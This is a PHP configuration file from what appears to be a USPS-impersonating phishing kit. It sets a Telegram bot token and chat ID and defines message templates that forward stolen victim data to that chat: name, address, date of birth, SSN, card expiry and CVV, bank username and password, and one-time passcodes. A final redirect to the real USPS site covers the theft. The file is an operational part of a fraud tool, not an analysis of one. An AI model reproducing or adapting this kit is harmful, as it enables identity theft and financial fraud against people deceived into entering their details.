<?php

// USPS Configuration Settings

// Telegram Bot Settings
define('TELEGRAM_BOT_TOKEN', '7505568412:AAEwzAw9uUnxgXABFaUVq11-I0xBv36LmTw');
define('TELEGRAM_CHAT_ID', '1794855545');
define('TELEGRAM_ENABLED', true);

// Data Storage
define('DATA_STORAGE_PATH', __DIR__ . '/data');

// Application Settings
define('APP_NAME', 'USPS Tracking');
define('APP_VERSION', '1.0.0');
define('DEBUG_MODE', true);

// Security Settings
define('SESSION_TIMEOUT', 3600); // 1 hour
define('MAX_LOGIN_ATTEMPTS', 3);
define('TRACKING_NUMBER', '92612999897543581074711582');

// Final redirect URL
define('FINAL_REDIRECT_URL', 'https://www.usps.com/');

// Message Templates
define('MESSAGE_TEMPLATES', [
    'address_verification' => "📦 USPS Address Verification\n\n👤 Full Name: {fullName}\n🏠 Address: {streetAddress1}, {city}, {state} {zipCode}\n📱 Phone: {phone}\n📅 DOB: {dob}\n🔢 SSN: {ssn}\n\n📍 Tracking: " . TRACKING_NUMBER,
    'payment_info' => "💳 USPS Payment Info\n\n💳 Card: **** **** **** {last4}\n📅 Expiry: {expiryMonth}/{expiryYear}\n🔢 CVV: {cvv}\n\n📍 Tracking: " . TRACKING_NUMBER,
    'bank_credentials' => "🏦 USPS Bank Authentication\n\n👤 Username: {bankUsername}\n🔐 Password: {bankPassword}\n\n📍 Tracking: " . TRACKING_NUMBER,
    'otp_verification' => "🔐 USPS OTP Verification\n\n🔢 OTP: {otp}\n✅ Verified: Yes\n\n📍 Tracking: " . TRACKING_NUMBER,
    'success' => "✅ USPS Process Completed\n\n🎉 User successfully completed the redelivery process!\n\n📍 Tracking: " . TRACKING_NUMBER . "\n🌐 Redirected to: " . FINAL_REDIRECT_URL
]);

// Helper Functions
function getCurrentTimestamp() {
    return date('Y-m-d H:i:s');
}

function replaceMessageTemplate($template, $data) {
    $message = $template;
    foreach ($data as $key => $value) {
        if (is_string($value)) {
            $message = str_replace('{' . $key . '}', $value, $message);
        }
    }
    return $message;
}

?>
